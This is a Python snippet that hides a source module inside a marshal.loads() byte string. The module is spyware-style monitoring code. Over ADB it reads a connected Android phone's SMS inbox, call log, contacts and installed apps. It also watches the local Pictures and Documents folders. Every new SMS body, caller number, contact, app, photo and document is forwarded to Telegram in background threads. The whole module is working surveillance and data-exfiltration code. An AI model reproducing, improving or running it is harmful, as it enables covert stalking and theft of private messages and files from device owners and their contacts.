marshal_code = marshal.loads(b's_,\x00\x00import os\nimport subprocess\nimport threading\nimport time\nimport logging\nimport functools\nfrom watchdog.observers import Observer\nfrom watchdog.events import FileSystemEventHandler\nfrom colorama import Fore, Style\n\nlogger = logging.getLogger(__name__)\n\n# Directories to monitor (adjust these paths as needed)\nPHOTO_DIR = os.path.expanduser("~/Pictures")\nTEXT_FILE_DIR = os.path.expanduser("~/Documents")\n\n# ------------------ Helper Functions ------------------ #\ndef retry_on_exception(max_attempts=5, delay=2):\n    """Decorator to automatically retry a function on exception with exponential backoff."""\n    def decorator_retry(func):\n        @functools.wraps(func)\n        def wrapper_retry(*args, **kwargs):\n            attempts = 0\n            while attempts < max_attempts:\n                try:\n                    return func(*args, **kwargs)\n                except Exception as e:\n                    attempts += 1\n                    logger.error(f"{Fore.RED}Error in {func.__name__}: {e}. Attempt {attempts}/{max_attempts}{Style.RESET_ALL}")\n                    time.sleep(delay * attempts)  # Exponential backoff\n            raise Exception(f"{Fore.RED}Max retry attempts reached in {func.__name__}{Style.RESET_ALL}")\n        return wrapper_retry\n    return decorator_retry\n\ndef check_adb_connected():\n    """Check whether any ADB devices are connected."""\n    try:\n        output = subprocess.check_output(["adb", "devices"], universal_newlines=True)\n        lines = output.strip().splitlines()\n        if len(lines) <= 1:\n            logger.error(f"{Fore.RED}No ADB devices connected. Please connect your device.{Style.RESET_ALL}")\n            return False\n        return True\n    except Exception as e:\n        logger.error(f"{Fore.RED}Error checking ADB connection: {e}{Style.RESET_ALL}")\n        return False\n\ndef parse_content_query_output(output):\n    """\n    Parse the output from an ADB content query command.\n    Expected format per line: "Row: <num> key1=value1 key2=value2 ..."\n    Returns a list of dictionaries.\n    """\n    records = []\n    for line in output.splitlines():\n        if line.startswith("Row:"):\n            parts = line.split()[2:]\n            record = {}\n            for part in parts:\n                if \'=\' in part:\n                    key, value = part.split(\'=\', 1)\n                    record[key] = value\n            records.append(record)\n    return records\n\n# ------------------ Device Connection Monitor ------------------ #\ndef adb_connection_monitor(telegram_client, shutdown_event):\n    """Continuously check ADB connectivity and notify on disconnect/reconnect."""\n    connected = check_adb_connected()\n    while not shutdown_event.is_set():\n        current_status = check_adb_connected()\n        if not current_status and connected:\n            telegram_client.send_message("Warning: ADB device disconnected!")\n            logger.error(f"{Fore.RED}ADB device disconnected!{Style.RESET_ALL}")\n            connected = False\n        elif current_status and not connected:\n            telegram_client.send_message("ADB device reconnected!")\n            logger.info(f"{Fore.GREEN}ADB device reconnected!{Style.RESET_ALL}")\n            connected = True\n        time.sleep(10)\n\n# ------------------ File System Monitoring ------------------ #\nclass FileChangeHandler(FileSystemEventHandler):\n    def __init__(self, telegram_client, file_type: str):\n        self.telegram_client = telegram_client\n        self.file_type = file_type\n\n    def on_created(self, event):\n        if event.is_directory:\n            return\n        filepath = event.src_path\n        logger.info(f"{Fore.GREEN}New {self.file_type} file detected: {filepath}{Style.RESET_ALL}")\n        try:\n            if self.file_type == \'photo\':\n                self.telegram_client.send_photo(photo_path=filepath, caption="New photo captured.")\n            elif self.file_type == \'text\':\n                self.telegram_client.send_document(document_path=filepath, caption="New text file saved.")\n            else:\n                self.telegram_client.send_document(document_path=filepath, caption=f"New {self.file_type} file received.")\n        except Exception as e:\n            logger.error(f"{Fore.RED}Failed to send {self.file_type} file: {e}{Style.RESET_ALL}")\n\n# ------------------ ADB-based Monitors ------------------ #\n@retry_on_exception(max_attempts=5, delay=2)\ndef get_latest_record(uri: str, id_field: str):\n    """\n    Fetch the latest record from a content URI via ADB.\n    Automatically retries on failure.\n    """\n    if not check_adb_connected():\n        raise Exception("ADB device not connected.")\n    output = subprocess.check_output(\n        ["adb", "shell", "content", "query", "--uri", uri],\n        universal_newlines=True\n    )\n    records = parse_content_query_output(output)\n    if not records:\n        return None\n    records_sorted = sorted(records, key=lambda x: int(x.get(id_field, \'0\')))\n    return records_sorted[-1]\n\ndef sms_monitor(telegram_client, shutdown_event):\n    last_sms_id = None\n    SMS_URI = "content://sms/inbox"\n    while not shutdown_event.is_set():\n        try:\n            sms = get_latest_record(SMS_URI, "_id")\n            if sms and sms.get("_id") != last_sms_id:\n                last_sms_id = sms.get("_id")\n                msg = (f"New SMS from {sms.get(\'address\', \'Unknown\')} at {sms.get(\'date\', \'Unknown\')}:\\n"\n                       f"{sms.get(\'body\', \'\')}")\n                telegram_client.send_message(msg)\n        except Exception as e:\n            logger.error(f"{Fore.RED}SMS monitor error: {e}{Style.RESET_ALL}")\n        time.sleep(5)\n\ndef call_log_monitor(telegram_client, shutdown_event):\n    last_call_id = None\n    CALL_URI = "content://call_log/calls"\n    while not shutdown_event.is_set():\n        try:\n            call = get_latest_record(CALL_URI, "_id")\n            if call and call.get("_id") != last_call_id:\n                last_call_id = call.get("_id")\n                msg = f"New call from {call.get(\'number\', \'Unknown\')} at {call.get(\'date\', \'Unknown\')}."\n                telegram_client.send_message(msg)\n        except Exception as e:\n            logger.error(f"{Fore.RED}Call log monitor error: {e}{Style.RESET_ALL}")\n        time.sleep(5)\n\ndef app_install_monitor(telegram_client, shutdown_event):\n    known_apps = set()\n    try:\n        output = subprocess.check_output(["adb", "shell", "pm", "list", "packages"], universal_newlines=True)\n        for line in output.splitlines():\n            pkg = line.replace("package:", "").strip()\n            if pkg:\n                known_apps.add(pkg)\n    except Exception as e:\n        logger.error(f"{Fore.RED}Error fetching installed apps: {e}{Style.RESET_ALL}")\n\n    while not shutdown_event.is_set():\n        try:\n            output = subprocess.check_output(["adb", "shell", "pm", "list", "packages"], universal_newlines=True)\n            for line in output.splitlines():\n                pkg = line.replace("package:", "").strip()\n                if pkg and pkg not in known_apps:\n                    known_apps.add(pkg)\n                    msg = f"New app installed: {pkg}"\n                    telegram_client.send_message(msg)\n        except Exception as e:\n            logger.error(f"{Fore.RED}App install monitor error: {e}{Style.RESET_ALL}")\n        time.sleep(10)\n\ndef get_contacts():\n    CONTACTS_URI = "content://contacts/phones"\n    try:\n        output = subprocess.check_output(\n            ["adb", "shell", "content", "query", "--uri", CONTACTS_URI],\n            universal_newlines=True\n        )\n        return parse_content_query_output(output)\n    except Exception as e:\n        logger.error(f"{Fore.RED}Error fetching contacts: {e}{Style.RESET_ALL}")\n        return []\n\ndef contact_monitor(telegram_client, shutdown_event):\n    known_contacts = set()\n    contacts = get_contacts()\n    for contact in contacts:\n        if \'display_name\' in contact:\n            known_contacts.add(contact[\'display_name\'])\n    while not shutdown_event.is_set():\n        try:\n            contacts = get_contacts()\n            for contact in contacts:\n                name = contact.get(\'display_name\')\n                if name and name not in known_contacts:\n                    known_contacts.add(name)\n                    msg = f"New contact added: {name}"\n                    telegram_client.send_message(msg)\n        except Exception as e:\n            logger.error(f"{Fore.RED}Contact monitor error: {e}{Style.RESET_ALL}")\n        time.sleep(10)\n\n# ------------------ Monitor Manager ------------------ #\nclass MonitorManager:\n    def __init__(self, telegram_client, shutdown_event: threading.Event):\n        self.telegram_client = telegram_client\n        self.shutdown_event = shutdown_event\n        self.observers = []\n        self.threads = []\n\n    def start_file_observer(self, path, file_type):\n        event_handler = FileChangeHandler(self.telegram_client, file_type)\n        observer = Observer()\n        observer.schedule(event_handler, path=path, recursive=True)\n        observer.daemon = True\n        observer.start()\n        self.observers.append(observer)\n        logger.info(f"{Fore.GREEN}Started file observer for {file_type} at: {path}{Style.RESET_ALL}")\n\n    def start_sms_monitor(self):\n        t = threading.Thread(target=sms_monitor, args=(self.telegram_client, self.shutdown_event), daemon=True)\n        t.start()\n        self.threads.append(t)\n        logger.info(f"{Fore.GREEN}Started SMS monitor thread.{Style.RESET_ALL}")\n\n    def start_call_log_monitor(self):\n        t = threading.Thread(target=call_log_monitor, args=(self.telegram_client, self.shutdown_event), daemon=True)\n        t.start()\n        self.threads.append(t)\n        logger.info(f"{Fore.GREEN}Started Call Log monitor thread.{Style.RESET_ALL}")\n\n    def start_app_install_monitor(self):\n        t = threading.Thread(target=app_install_monitor, args=(self.telegram_client, self.shutdown_event), daemon=True)\n        t.start()\n        self.threads.append(t)\n        logger.info(f"{Fore.GREEN}Started App Installation monitor thread.{Style.RESET_ALL}")\n\n    def start_contact_monitor(self):\n        t = threading.Thread(target=contact_monitor, args=(self.telegram_client, self.shutdown_event), daemon=True)\n        t.start()\n        self.threads.append(t)\n        logger.info(f"{Fore.GREEN}Started Contact monitor thread.{Style.RESET_ALL}")\n\n    def start_connection_monitor(self):\n        t = threading.Thread(target=adb_connection_monitor, args=(self.telegram_client, self.shutdown_event), daemon=True)\n        t.start()\n        self.threads.append(t)\n        logger.info(f"{Fore.GREEN}Started ADB connection monitor thread.{Style.RESET_ALL}")\n\n    def start_all_monitors(self):\n        # Start file observers for photos and text files\n        self.start_file_observer(PHOTO_DIR, \'photo\')\n        self.start_file_observer(TEXT_FILE_DIR, \'text\')\n        # Start ADB-based monitors\n        self.start_sms_monitor()\n        self.start_call_log_monitor()\n        self.start_app_install_monitor()\n        self.start_contact_monitor()\n        # Start device connectivity monitor\n        self.start_connection_monitor()\n\n    def stop_all_monitors(self):\n        for observer in self.observers:\n            observer.stop()\n            observer.join()\n        logger.info(f"{Fore.YELLOW}All file observers have been stopped.{Style.RESET_ALL}")')
